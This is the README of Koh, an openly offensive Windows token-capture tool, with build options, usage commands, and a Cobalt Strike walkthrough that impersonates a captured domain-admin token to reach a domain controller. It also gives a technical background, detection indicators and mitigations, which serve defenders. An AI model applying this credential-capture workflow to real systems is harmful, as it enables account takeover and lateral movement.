# Koh

----

Koh is a C# and Beacon Object File (BOF) toolset that allows for the capture of user credential material via purposeful token/logon session leakage.

Some code was inspired by [Elad Shamir](https://twitter.com/elad_shamir)'s [Internal-Monologue](https://github.com/eladshamir/Internal-Monologue) project (no license), as well as [KB180548](https://mskb.pkisolutions.com/kb/180548). For why this is possible and Koh's approeach, see the [Technical Background](#technical-background) section of this README.

For a deeper explanation of the motivation behind Koh and its approach, see the [Koh: The Token Stealer](https://posts.specterops.io/koh-the-token-stealer-41ca07a40ed6) post.

[@harmj0y](https://twitter.com/harmj0y) is the primary author of this code base. [@tifkin_](https://twitter.com/tifkin_) helped with the approach, BOF implementation, and some token mechanics.

Koh is licensed under the BSD 3-Clause license.

## Table of Contents

- [Koh](#koh)
  - [Table of Contents](#table-of-contents)
  - [Koh Server](#koh-server)
    - [Compilation](#compilation)
    - [Usage](#usage)
    - [Example - Listing Logon Sessions](#example---listing-logon-sessions)
    - [Example - Monitoring for Logon Sessions (with group SID filtering)](#example---monitoring-for-logon-sessions-with-group-sid-filtering)
  - [Koh Client](#koh-client)
    - [Usage](#usage-1)
    - [Group SID Filtering](#group-sid-filtering)
    - [Example - Capture](#example---capture)
  - [Technical Background](#technical-background)
    - [Why This Is Possible](#why-this-is-possible)
    - [Approach](#approach)
      - [Possible Approaches](#possible-approaches)
      - [Our Approach](#our-approach)
      - [Advantages/Disadvantages Versus Traditional Credential Extraction](#advantages-disadvantages-versus-traditional-credential-extraction)
        - [Advantages](#advantages)
        - [Disadvantages](#disadvantages)
  - [The Inline Shenanigans Bug](#the-inline-shenanigans-bug)
  - [IOCs](#iocs)
  - [Mitigations](#mitigations)
  - [TODO](#todo)
  

## Koh Server

The Koh "server" captures tokens and uses named pipes for control/communication. This can be wrapped in [Donut](https://github.com/TheWover/donut/) and injected into any ~~high-integrity~~ SYSTEM process (see [The Inline Shenanigans Bug](#the-inline-shenanigans-bug)).

## Compilation

We are not planning on releasing binaries for Koh, so you will have to compile yourself :)

Koh has been built against .NET 4.7.2 and is compatible with Visual Studio 2019 Community Edition. Simply open up the project .sln, choose "Release", and build. The `Koh.exe` assembly and `Koh.bin` [Donut-built](https://github.com/TheWover/donut) PIC will be output to the main directory. The Donut blob is both x86/x64 compatible, and is built with the following options using v0.9.3 of Donut at `./Misc/Donut.exe`:

```
  [ Instance type : Embedded
  [ Entropy       : Random names + Encryption
  [ Compressed    : Xpress Huffman
  [ File type     : .NET EXE
  [ Parameters    : capture
  [ Target CPU    : x86+amd64
  [ AMSI/WDLP     : abort
```

Donut's license is BSD 3-clause.

### Usage
   
   `Koh.exe Koh.exe <list | monitor | capture> [GroupSID... GroupSID2 ...]`

* **list** - lists (non-network) logon sessions
* **monitor** - monitors for new/unique (non-network) logon sessions
* **capture** - captures one unique token per SID found for new (non-network) logon sessions

Group SIDs can be supplied command line as well, causing Koh to monitor/capture only logon sessions that contain the specified group SIDs in their negotiated token information.

### Example - Listing Logon Sessions

```
C:\Temp>Koh.exe list

 __  ___   ______    __    __
|  |/  /  /  __  \  |  |  |  |
|  '  /  |  |  |  | |  |__|  |
|    <   |  |  |  | |   __   |
|  .  \  |  `--'  | |  |  |  |
|__|\__\  \______/  |__|  |__|
                     v1.0.0


  [*] Command: list

  [*] Elevated to SYSTEM


  [*] New Logon Session - 6/22/2022 2:51:46 PM
      UserName    : THESHIRE\testuser
      LUID        : 207990196
      LogonType   : Interactive
      AuthPackage : Kerberos
      User SID    : S-1-5-21-937929760-3187473010-80948926-1119
      Origin LUID : 1677733 (0x1999a5)

  [*] New Logon Session - 6/22/2022 2:51:46 PM
      UserName    : THESHIRE\DA
      LUID        : 81492692
      LogonType   : Interactive
      AuthPackage : Negotiate
      User SID    : S-1-5-21-937929760-3187473010-80948926-1145
      Origin LUID : 1677765 (0x1999c5)

  [*] New Logon Session - 6/22/2022 2:51:46 PM
      UserName    : THESHIRE\DA
      LUID        : 81492608
      LogonType   : Interactive
      AuthPackage : Kerberos
      User SID    : S-1-5-21-937929760-3187473010-80948926-1145
      Origin LUID : 1677765 (0x1999c5)

  [*] New Logon Session - 6/22/2022 2:51:46 PM
      UserName    : THESHIRE\harmj0y
      LUID        : 1677733
      LogonType   : Interactive
      AuthPackage : Kerberos
      User SID    : S-1-5-21-937929760-3187473010-80948926-1104
      Origin LUID : 999 (0x3e7)
    
```

### Example - Monitoring for Logon Sessions (with group SID filtering)

Only lists results that have the domain admins (-512) group SID in their token information:

```
C:\Temp>Koh.exe monitor S-1-5-21-937929760-3187473010-80948926-512

 __  ___   ______    __    __
|  |/  /  /  __  \  |  |  |  |
|  '  /  |  |  |  | |  |__|  |
|    <   |  |  |  | |   __   |
|  .  \  |  `--'  | |  |  |  |
|__|\__\  \______/  |__|  |__|
                     v1.0.0


  [*] Command: monitor

  [*] Starting server with named pipe: imposecost

  [*] Elevated to SYSTEM

  [*] Targeting group SIDs:
      S-1-5-21-937929760-3187473010-80948926-512

  [*] New Logon Session - 6/22/2022 2:52:17 PM
      UserName    : THESHIRE\DA
      LUID        : 81492692
      LogonType   : Interactive
      AuthPackage : Negotiate
      User SID    : S-1-5-21-937929760-3187473010-80948926-1145
      Origin LUID : 1677765 (0x1999c5)

  [*] New Logon Session - 6/22/2022 2:52:17 PM
      UserName    : THESHIRE\DA
      LUID        : 81492608
      LogonType   : Interactive
      AuthPackage : Kerberos
      User SID    : S-1-5-21-937929760-3187473010-80948926-1145
      Origin LUID : 1677765 (0x1999c5)

  [*] New Logon Session - 6/22/2022 2:52:17 PM
      UserName    : THESHIRE\harmj0y
      LUID        : 1677733
      LogonType   : Interactive
      AuthPackage : Kerberos
      User SID    : S-1-5-21-937929760-3187473010-80948926-1104
      Origin LUID : 999 (0x3e7)
  
```


## Koh Client

The current usable client is a Beacon Object File at `.\Clients\BOF\`. Load the `.\Clients\BOF\KohClient.cna` aggressor script in your Cobalt Strike client to enable BOF control of the Koh server. The only requirement for using captured tokens is **SeImpersonatePrivilege**. The communication named pipe has an "Everyone" DACL but uses a basic shared password (super securez).

To compile fresh on Linux using Mingw, see the `.\Clients\BOF\build.sh` script. The only requirement (on Debian at least) should be `apt-get install gcc-mingw-w64`

### Usage

```
beacon> help koh
koh list              - lists captured tokens
koh groups LUID       - lists the group SIDs for a captured token
koh filter list       - lists the group SIDs used for capture filtering
koh filter add SID    - adds a group SID for capture filtering
koh filter remove SID - removes a group SID from capture filtering
koh filter reset      - resets the SID group capture filter
koh impersonate LUID  - impersonates the captured token with the give LUID
koh release all       - releases all captured tokens
koh release LUID      - releases the captured token for the specified LUID
koh exit              - signals the Koh server to exit
```

### Group SID Filtering

The `koh filter add S-1-5-21-<DOMAIN>-<RID>` command will only capture tokens that contain the supplied group SID. This command can be run multiple times to add additional SIDs for capture. This can help prevent possible stability issues due to a large number of token leaks.


### Example - Capture

"Captures" logon sessions by negotiating usable tokens for each new session.

Server:

```
C:\Temp>Koh.exe capture

 __  ___   ______    __    __
|  |/  /  /  __  \  |  |  |  |
|  '  /  |  |  |  | |  |__|  |
|    <   |  |  |  | |   __   |
|  .  \  |  `--'  | |  |  |  |
|__|\__\  \______/  |__|  |__|
                     v1.0.0


  [*] Command: capture

  [*] Starting server with named pipe: imposecost

  [*] Elevated to SYSTEM


  [*] New Logon Session - 6/22/2022 2:53:01 PM
      UserName              : THESHIRE\testuser
      LUID                  : 207990196
      LogonType             : Interactive
      AuthPackage           : Kerberos
      User SID              : S-1-5-21-937929760-3187473010-80948926-1119
      Credential UserName   : testuser@THESHIRE.LOCAL
      Origin LUID           : 1677733 (0x1999a5)

      [*] Successfully negotiated a token for LUID 207990196 (hToken: 848)


  [*] New Logon Session - 6/22/2022 2:53:01 PM
      UserName              : THESHIRE\DA
      LUID                  : 81492692
      LogonType             : Interactive
      AuthPackage           : Negotiate
      User SID              : S-1-5-21-937929760-3187473010-80948926-1145
      Credential UserName   : da@THESHIRE.LOCAL
      Origin LUID           : 1677765 (0x1999c5)

      [*] Successfully negotiated a token for LUID 81492692 (hToken: 976)


  [*] New Logon Session - 6/22/2022 2:53:01 PM
      UserName              : THESHIRE\harmj0y
      LUID                  : 1677733
      LogonType             : Interactive
      AuthPackage           : Kerberos
      User SID              : S-1-5-21-937929760-3187473010-80948926-1104
      Credential UserName   : harmj0y@THESHIRE.LOCAL
      Origin LUID           : 999 (0x3e7)

      [*] Successfully negotiated a token for LUID 1677733 (hToken: 980)

```

BOF client:

```
beacon> shell dir \\dc.theshire.local\C$
[*] Tasked beacon to run: dir \\dc.theshire.local\C$
[+] host called home, sent: 69 bytes
[+] received output:
Access is denied.

beacon> getuid
[*] Tasked beacon to get userid
[+] host called home, sent: 20 bytes
[*] You are NT AUTHORITY\SYSTEM (admin)

beacon> koh list
[+] host called home, sent: 6548 bytes
[+] received output:
[*] Using KohPipe                    : \\.\pipe\imposecost

[+] received output:

Username     : THESHIRE\localadmin (S-1-5-21-937929760-3187473010-80948926-1000)
LUID         : 67556826
CaptureTime  : 6/21/2022 1:24:42 PM
LogonType    : Interactive
AuthPackage  : Negotiate
CredUserName : localadmin@THESHIRE.LOCAL
Origin LUID  : 1676720

Username     : THESHIRE\da (S-1-5-21-937929760-3187473010-80948926-1145)
LUID         : 67568439
CaptureTime  : 6/21/2022 1:24:50 PM
LogonType    : Interactive
AuthPackage  : Negotiate
CredUserName : da@THESHIRE.LOCAL
Origin LUID  : 1677765

Username     : THESHIRE\harmj0y (S-1-5-21-937929760-3187473010-80948926-1104)
LUID         : 1677733
CaptureTime  : 6/21/2022 1:23:10 PM
LogonType    : Interactive
AuthPackage  : Kerberos
CredUserName : harmj0y@THESHIRE.LOCAL
Origin LUID  : 999

beacon> koh groups 67568439
[+] host called home, sent: 6548 bytes
[+] received output:
[*] Using KohPipe                    : \\.\pipe\imposecost

[+] received output:
S-1-5-21-937929760-3187473010-80948926-513
S-1-5-21-937929760-3187473010-80948926-512
S-1-5-21-937929760-3187473010-80948926-525
S-1-5-21-937929760-3187473010-80948926-572

beacon> koh impersonate 67568439
[+] host called home, sent: 6548 bytes
[+] received output:
[*] Using KohPipe                    : \\.\pipe\imposecost

[+] received output:
[*] Enabled SeImpersonatePrivilege

[+] received output:
[*] Creating impersonation named pipe: \\.\pipe\imposingcost

[+] received output:
[*] Impersonation succeeded. Duplicating token.

[+] received output:
[*] Impersonated token successfully duplicated.

[+] Impersonated THESHIRE\da

beacon> getuid
[*] Tasked beacon to get userid
[+] host called home, sent: 20 bytes
[*] You are THESHIRE\DA (admin)

beacon> shell dir \\dc.theshire.local\C$
[*] Tasked beacon to run: dir \\dc.theshire.local\C$
[+] host called home, sent: 69 bytes
[+] received output:
 Volume in drive \\dc.theshire.local\C$ has no label.
 Volume Serial Number is A4FF-7240

 Directory of \\dc.theshire.local\C$

01/04/2021  11:43 AM    <DIR>          inetpub
05/30/2019  03:08 PM    <DIR>          PerfLogs
05/18/2022  01:27 PM    <DIR>          Program Files
04/15/2021  09:44 AM    <DIR>          Program Files (x86)
03/20/2020  12:28 PM    <DIR>          RBFG
10/20/2021  01:14 PM    <DIR>          Temp
05/23/2022  06:30 PM    <DIR>          tools
03/11/2022  04:10 PM    <DIR>          Users
06/21/2022  01:30 PM    <DIR>          Windows
               0 File(s)              0 bytes
               9 Dir(s)  40,504,201,216 bytes free
```

## Technical Background

When a new logon session is estabslished on a system, a new token for the logon session is created by LSASS using the NtCreateToken() API call and returned by the caller of LsaLogonUser(). This [increases the ReferenceCount](https://systemroot.gitee.io/pages/apiexplorer/d0/d9/rmlogon_8c-source.html#l00278) field of the logon session kernel structure. When this ReferenceCount reaches 0, the logon session is destroyed. Because of the information described in the [Why This Is Possible](#why-this-is-possible) section, Windows systems **will NOT** release a logon session if a token handle still exists to it (and therefore the reference count != 0).

So if we can get a handle to a newly created logon session via a token, we can keep that logon session open and later impersonate that token to utilize any cached credentials it contains.

### Why This Is Possible

According [to this post by a Microsoft engineer](https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/using-debugging-tools-to-find-token-and-session-leaks/ba-p/400472):

```
After MS16-111, when security tokens are leaked, the logon sessions associated with those security tokens also remain on the system until all associated tokens are closed... even after the user has logged off the system. If the tokens associated with a given logon session are never released, then the system now also has a permanent logon session leak as well.
```

[MS16-111](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-111) was applied back to Windows 7/Server 2008, so this approach should be effective for everything except Server 2003 systems.


## Approach

Enumerating logon sessions is easy (from an elevated context) through the use of the [LsaEnumerateLogonSessions()](https://docs.microsoft.com/en-us/windows/win32/api/ntsecapi/nf-ntsecapi-lsaenumeratelogonsessions) Win32 API. What is more difficult is taking a specific logon session identifier (LUID) and _somehow_ getting a usable token linked to that session.

### Possible Approaches

We brainstormed a few ways to a) hold open logon sessions and b) abuse this for token impersonation/use of cached credentials.

1. The first approach was to use **NtCreateToken()** which allows you to specify a logon session ID (LUID) to create a new token.
   * Unfortunately, you need **SeCreateTokenPrivilege** which is traditionally only held by LSASS, meaning you need to steal LSASS' token which isn't ideal.
   * One possibility was to add **SeCreateTokenPrivilege** to NT AUTHORITY\SYSTEM via LSA policy modification, but this would need a reboot/new logon session to express the new user rights.
2. You can also focus on just RemoteInteractive logon sessions by using **WTSQueryUserToken()** to get tokens for new desktop sessions to clone. 
   * This is the approach apparently [demonstrated by Ryan](https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/using-debugging-tools-to-find-token-and-session-leaks/ba-p/400472).
   * Unfortunately this misses newly created local sessions and incoming sessions created from things like PSEXEC.
3. On a new logon session, open up a handle to every reachable process and enumerate all existing handles, cloning the token linked to the new logon session.
   * This requires opening up lots of processes/handles, which looks very suspicious.
4. The **AcquireCredentialsHandle()**/**InitializeSecurityContext()**/**AcceptSecurityContext()** approach described below, which is what we went with.

### Our Approach

The SSPI [AcquireCredentialsHandle()](https://docs.microsoft.com/en-us/windows/win32/secauthn/acquirecredentialshandle--negotiate) call has a **pvLogonID** field which states:
```
A pointer to a locally unique identifier (LUID) that identifies the user. This parameter is provided for file-system processes such as network redirectors. 
```

**Note:** In order to utilize a logon session LUID with **AcquireCredentialsHandle()** you need **SeTcbPrivilege**, however this is usually easier to get than **SeCreateTokenPrivilege**.

Using this call while specifying a logon session ID/LUID appears to increase the ReferenceCount for the logon session structure, preventing it from being released. However, we're not presented with another problem: given a "leaked"/held open logon session, how do we get a usable token from it? **WTSQueryUserToken()** only works with desktop sessions, and there's no userland API that we could find that lets you map a LUID to a usable token.

_However_ we can use two additional SSPI functions, [InitializeSecurityContext()](https://docs.microsoft.com/en-us/windows/win32/secauthn/initializesecuritycontext--negotiate) and [AcceptSecurityContext()](https://docs.microsoft.com/en-us/windows/win32/secauthn/acceptsecuritycontext--negotiate) to act as client and server to ourselves, negotiating a new security context that we can then use with [QuerySecurityContextToken()](https://docs.microsoft.com/en-us/windows/win32/api/sspi/nf-sspi-querysecuritycontexttoken) to get a usable token. This was documented in KB180548 ([mirrored by PKISolutions here](https://mskb.pkisolutions.com/kb/180548)) for the purposes of credential validation. This is a similar approach to [Internal-Monologue](https://github.com/eladshamir/Internal-Monologue), except we are completing the entire handshake process, producing a token, and then holding that for later use.

Filtering can then be done on the token itself, via [CheckTokenMembership()](https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-checktokenmembership) or [GetTokenInformation()](https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-gettokeninformation). For example, we could release any tokens except for ones belonging to domain admins, or specific groups we want to target.


### Advantages/Disadvantages Versus Traditional Credential Extraction

#### Advantages
   * Works for both local and inbound (non-network) logons.
   * Works for inbound sessions created via Kerberos and NTLM.
   * Doesn’t require opening up a handle to multiple processes.
   * Doesn't create a new logon event or logon session.
   * Doesn't create additional event logs on the DC outside of normal system ticket renewal behavior (I don't think?)
   * No default lifetime on the tokens (I don't think?) so _access_ should work as long as the captured account’s credentials don't change and the system doesn’t reboot.
   * Reuses legitimate captured auth on a system, so should "blend with the noise" reasonably well.


#### Disadvantages
   * Access is only usable as long as the system doesn't reboot.
   * Doesn't let you reuse access on other systems
     * However, and existing ticket/credential extraction can still be done on the leaked logon session.
   * May cause instability if a large number of sessions are leaked (though this can be mitigated with token group SID filtering) and restricting the maximum number of captured tokens (default of 1000 here).


## The Inline Shenanigans Bug

I've been coding for a decent amount of time. This is one of the weirder and frustrating-to-track-down bugs I've hit in a while - please help me with this lol.

* When the Koh.exe assembly is run from an elevated (but non-SYSTEM) context, everything works properly.

* If the Koh.exe assembly is run via Cobalt Strike's Beacon fork&run process with `execute-assembly` from an elevated (but non-SYSTEM) context, everything works properly.

* If the Koh.exe assembly is run _inline_ (via [InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly) or [Inject-Assembly](https://github.com/kyleavery/inject-assembly)) for a Cobalt Strike Beacon that's running in a SYSTEM context, everything works properly.

* **However** If the Koh.exe assembly is run _inline_ (via [InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly) or [Inject-Assembly](https://github.com/kyleavery/inject-assembly)) for a Cobalt Strike Beacon that's running in an elevated, but not SYSTEM, context, the call to AcquireCredentialsHandle() fails with `SEC_E_NO_CREDENTIALS` and everything fails ¯\\\_(ツ)\_/¯

We have tried (with no success):
* Spinning off everything to a separate thread, specifying a STA thread apartment.
* Trying to diagnose RPC weirdness (still more to investigate here).
* Using DuplicateTokenEx and SetThreadToken instead of ImpersonateLoggedOnUser.
* Checking if we have the proper SeTcbPrivilege right before the AcquireCredentialsHandle call (we do).

For all intents and purposes, the thread context right before the call to AcquireCredentialsHandle works in this context, but the result errors out. **And we have no idea why.**

If you have an idea of what this might be, please let us know! And if you want to try playing around with a simpler assembly, check out the [AcquireCredentialsHandle](https://github.com/harmj0y/AcquireCredentialsHandle) repo on my GitHub for troubleshooting.


## IOCs

To quote [@tifkin_](https://twitter.com/tifkin_) _"Everything is stealthy until someone is looking for it."_ While Koh's approach is slightly different than others, there are still IOCs that can be used to detect it.

The unique TypeLib GUID for the C# Koh collector is `4d5350c8-7f8c-47cf-8cde-c752018af17e` as detailed in the Koh.yar Yara rule in this repo. If this is not changed on compilation, it should be a very high fidelity indicator of the Koh server.

When the Koh server starts is opens up a named pipe called `\\.\pipe\imposecost` that stays open as long as Koh is running. The default password used for Koh communication is `password`, so sending `password list` to any `\\.\pipe\imposecost` pipe will let you confirm if Koh is indeed running. The default impersonation pipe used is `\\.pipe\imposingcost`.

If Koh starts in an elevated context but not as SYSTEM, a handle/token clone of `winlogon` is performed to perform a `getsystem` type elevation.

I'm sure that no attackers will change the indicators mentioned above.

There are likely some RPC artifacts for the token capture that we're hoping to investigate. We will update this section of the README if we find any additional detection artifacts along these lines. Hooking of some of the possibly-uncommon APIs used by Koh ([LsaEnumerateLogonSessions](https://docs.microsoft.com/en-us/windows/win32/api/ntsecapi/nf-ntsecapi-lsaenumeratelogonsessions) or the specific AcquireCredentialsHandle/InitializeSecurityContext/AcceptSecurityContext, specifically using a LUID in [AcquireCredentialsHandle](https://docs.microsoft.com/en-us/windows/win32/secauthn/acquirecredentialshandle--general)) could be explored for effectiveness, but alas, I am not an EDR.


## Mitigations

After publishing the [Koh: The Token Stealer](https://posts.specterops.io/koh-the-token-stealer-41ca07a40ed6) post, I had a great [exchange](https://twitter.com/harmj0y/status/1545535785029345280) between [@cnotin](https://twitter.com/cnotin) and [@SteveSyfuhs](https://twitter.com/SteveSyfuhs) about what ended up being a partial mitigation for this approach.

The [KB2871997](https://support.microsoft.com/en-us/topic/microsoft-security-advisory-update-to-improve-credentials-protection-and-management-may-13-2014-93434251-04ac-b7f3-52aa-9f951c14b649) patch introduced a `TokenLeakDetectDelaySecs` setting, which triggers the "_...clearing of any credentials of logged off users..._". By default in fact, members of the ["Protected Users Security Group"](https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group) have this behavior enforced regardless of the registry setting. However, setting this to a non-zero value will clear ALL credentials out of memory when a user logs off. Specifically, as [Steve mentions:](https://twitter.com/SteveSyfuhs/status/1545822123926597632) `If set, it'll start a timer on a sessions *interactive* logoff event, and on fire will purge anything still tied to it. Off by default. Protected Users always on, with a default of 30s.`

There are two important things to note in the above paragraph: "logoff event" and "interactive". This can result in some situations where a user's credential is NOT cleared:

- If a credential is present via a `runas` or `runas /netonly` type spawn or something similar, there is no logoff event when the process stops and the credential/token can still be captured.
- If the credential is present via an RDP session where the user just disconnects instead of logs out, there is no logoff event when the process stops and the credential/token can still be captured.

(I need to test other logon situations like NetworkClearText.)

However, if the user is in the "Protected Users Security Group" or `TokenLeakDetectDelaySecs` is non-zero, and the user actively logs off of an interactive or remote interactive (RDP) session, the credentials will be cleared. I need to program Koh to better deal with these specific types of situations.

TL;DR you should really be using the "Protected Users Security Group" for sensitive users, and see if setting `TokenLeakDetectDelaySecs` to a value like 30 is doable in your environment.

## TODO

* Additional testing in the lab and field. Possible concerns:
   * Stability in production environments, specifically intentional token leakage causing issues on highly-trafficked servers
   * Total actual effective token lifetime
* "Remote" client that allows for monitoring through the Koh named pipe remotely
* Implement more clients (PowerShell, C#, C++, etc.)
* Fix the [Inline Shenanigans Bug](#the-inline-shenanigans-bug)
* Handle "Protected Users"/TokenLeakDetectDelaySecs situations better